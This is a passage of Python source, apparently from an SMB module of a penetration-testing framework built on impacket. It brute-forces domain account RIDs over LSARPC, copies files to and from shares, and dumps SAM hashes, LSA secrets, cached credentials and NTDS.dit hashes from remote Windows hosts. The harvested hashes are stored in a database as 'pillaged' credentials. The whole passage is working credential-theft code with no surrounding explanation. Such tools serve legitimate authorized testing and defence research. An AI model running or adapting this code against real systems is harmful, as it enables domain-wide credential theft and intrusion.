                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)

            dce = rpctransport.get_dce_rpc()
            dce.connect()
        except Exception as e:
            self.logger.error('Error creating DCERPC connection: {}'.format(e))
            return entries

        # Want encryption? Uncomment next line
        # But make SIMULTANEOUS variable <= 100
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)

        # Want fragmentation? Uncomment next line
        #dce.set_max_fragment_size(32)

        self.logger.success('Brute forcing RIDs')
        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)

        domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        soFar = 0
        SIMULTANEOUS = 1000
        for j in range(maxRid//SIMULTANEOUS+1):
            if (maxRid - soFar) // SIMULTANEOUS == 0:
                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
            else:
                sidsToCheck = SIMULTANEOUS

            if sidsToCheck == 0:
                break

            sids = list()
            for i in range(soFar, soFar+sidsToCheck):
                sids.append(domainSid + '-%d' % i)
            try:
                lsat.hLsarLookupSids(dce, policyHandle, sids,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    soFar += SIMULTANEOUS
                    continue
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp['TranslatedNames']['Names']):
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    rid    = soFar + n
                    domain = resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name']
                    user   = item['Name']
                    sid_type = SID_NAME_USE.enumItems(item['Use']).name
                    self.logger.highlight("{}: {}\\{} ({})".format(rid, domain, user, sid_type))
                    entries.append({'rid': rid, 'domain': domain, 'username': user, 'sidtype': sid_type})

            soFar += SIMULTANEOUS

        dce.disconnect()

        return entries

    @requires_admin
    def put_file(self):
        self.logger.info('Copy {} to {}'.format(self.args.put_file[0], self.args.put_file[1]))
        with open(self.args.put_file[0], 'rb') as file:
            try:
                self.conn.putFile(self.args.share, self.args.put_file[1], file.read)
                self.logger.success('Created file {} on \\\\{}{}'.format(self.args.put_file[0], self.args.share, self.args.put_file[1]))
            except Exception as e:
                self.logger.error('Error writing file to share {}: {}'.format(self.args.share, e))

    @requires_admin
    def get_file(self):
        self.logger.info('Copy {} to {}'.format(self.args.get_file[0], self.args.get_file[1]))
        with open(self.args.get_file[1], 'wb+') as file:
            try:
                self.conn.getFile(self.args.share, self.args.get_file[0], file.write)
                self.logger.success('File {} was transferred to {}'.format(self.args.get_file[0], self.args.get_file[1]))
            except Exception as e:
                self.logger.error('Error reading file {}: {}'.format(self.args.share, e))

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))

    @requires_admin
    def sam(self):
        self.enable_remoteops()

        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_sam_hash(sam_hash, host_id):
            add_sam_hash.sam_hashes += 1
            self.logger.highlight(sam_hash)
            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
            self.db.add_credential('hash', self.hostname, username, ':'.join((lmhash, nthash)), pillaged_from=host_id)
        add_sam_hash.sam_hashes = 0

        if self.remote_ops and self.bootkey:
            #try:
            SAMFileName = self.remote_ops.saveSAM()
            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, host_id))

            self.logger.success('Dumping SAM hashes')
            SAM.dump()
            SAM.export(self.output_filename)

            self.logger.success('Added {} SAM hashes to the database'.format(highlight(add_sam_hash.sam_hashes)))

            #except Exception as e:
                #self.logger.error('SAM hashes extraction failed: {}'.format(e))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            SAM.finish()

    @requires_admin
    def lsa(self):
        self.enable_remoteops()

        def add_lsa_secret(secret):
            add_lsa_secret.secrets += 1
            self.logger.highlight(secret)
        add_lsa_secret.secrets = 0

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()

            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
                             perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))

            self.logger.success('Dumping LSA secrets')
            LSA.dumpCachedHashes()
            LSA.exportCached(self.output_filename)
            LSA.dumpSecrets()
            LSA.exportSecrets(self.output_filename)

            self.logger.success('Dumped {} LSA secrets to {} and {}'.format(highlight(add_lsa_secret.secrets),
                                                                            self.output_filename + '.secrets', self.output_filename + '.cached'))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            LSA.finish()

    def ntds(self):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName   = None

        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            add_ntds_hash.ntds_hashes += 1
            self.logger.highlight(ntds_hash)
            if ntds_hash.find('$') == -1:
                if ntds_hash.find('\\') != -1:
                    domain, hash = ntds_hash.split('\\')
                else:
                    domain = self.domain
                    hash = ntds_hash

                try:
                    username,_,lmhash,nthash,_,_,_ = hash.split(':')
                    parsed_hash = ':'.join((lmhash, nthash))
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except:
                    logging.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                logging.debug("Dumped hash is a computer account, not adding to db")
        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        if self.remote_ops:
            try:
                if self.args.ntds == 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

            except Exception as e:
                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                self.logger.error(e)

        NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
                        remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
                        pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename,
                        justUser=None, printUserStatus=False,
                        perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))

        try:
            self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
            NTDS.dump()
            self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',                                                                                                            highlight(add_ntds_hash.added_to_db)))
        except Exception as e:
            #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                # We don't store the resume file if this error happened, since this error is related to lack
                # of enough privileges to access DRSUAPI.
            #    resumeFile = NTDS.getResumeSessionFile()
            #    if resumeFile is not None:
            #        os.unlink(resumeFile)
            self.logger.error(e)


        try:
            self.remote_ops.finish()
        except Exception as e:
            logging.debug("Error calling remote_ops.finish(): {}".format(e))

        NTDS.finish()